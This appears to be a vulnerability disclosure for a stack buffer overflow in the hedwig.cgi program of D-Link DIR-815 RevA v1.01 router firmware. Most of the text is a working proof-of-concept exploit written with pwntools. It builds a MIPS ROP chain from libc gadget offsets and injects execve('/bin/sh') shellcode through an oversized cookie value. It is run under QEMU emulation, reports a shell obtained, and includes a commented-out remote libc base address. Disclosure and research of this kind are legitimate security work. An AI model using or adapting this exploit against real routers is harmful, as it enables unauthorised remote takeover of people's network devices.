# D-Link DIR-815 RevA v1.01 router has a buffer overflow vulnerability in hedwig.cgi

In the D-Link DIR-815 RevA router firmware version v1.01, the hedwig.cgi CGI program has a stack overflow vulnerability.

The attacker can use the stack overflow to hijack the program flow, main->hedwigcgi_main->cgibin_parse_request()->sub_403B10->sub_403794, and only need to post the parameters to successfully getshell

![image-20250612202813877](https://s2.loli.net/2025/06/12/ivAekQ7ouOLcMGq.png)

![image-20250612203244327](https://s2.loli.net/2025/06/12/Q7S5uoYCBhwfEbJ.png)

![image-20250612204211204](https://s2.loli.net/2025/06/12/eKqvxnpLmGsTgEb.png)

## POC

```
from pwn import*
context.terminal = ['gnome-terminal', '--', 'bash', '-c']
context.arch='mips'
context.os='linux'
context.log_level = 'debug'
def bug():
    gdb.attach(target=("127.0.0.1", 1234), exe="./htdocs/cgibin",
               gdbscript="""
               b *0x409680\n    
               c\n
               """)
    pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

libc_base = 0x7f738000#local
#libc_base = 0x77f34000 #remote
payload = b'a'*0x3cd
payload += b'a'*(4+0x18+12-2)
payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)
payload += b'abcd'
payload += p32(libc_base + 0x56BD0) # s3  sleep
payload += cyclic(20)#b'a'*(4*5)
payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)
 
payload += b'a'*0x18
payload += b'a'*(4*4)
payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)
payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)
 
shellcode = asm('''
    slti $a2, $zero, -1
    li $t7, 0x69622f2f
    sw $t7, -12($sp)
    li $t6, 0x68732f6e
    sw $t6, -8($sp)
    sw $zero, -4($sp)
    la $a0, -12($sp)
    slti $a1, $zero, -1
    li $v0, 4011
    syscall 0x40404
''')
payload += b'a'*0x18
payload += shellcode


payload = b"uid=" + payload
post_content = "Thir0th=Pwner"
p = process(b"""
    qemu-mipsel -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E HTTP_COOKIE=\"""" + payload + b"""\" \
    -g 1234 ./htdocs/cgibin
""", shell = True)

#bug()
p.send(post_content)
inter()	

```

Final result: Successful getshell

![image-20250612203559851](https://s2.loli.net/2025/06/12/3l6hSnRvu5MUtOB.png)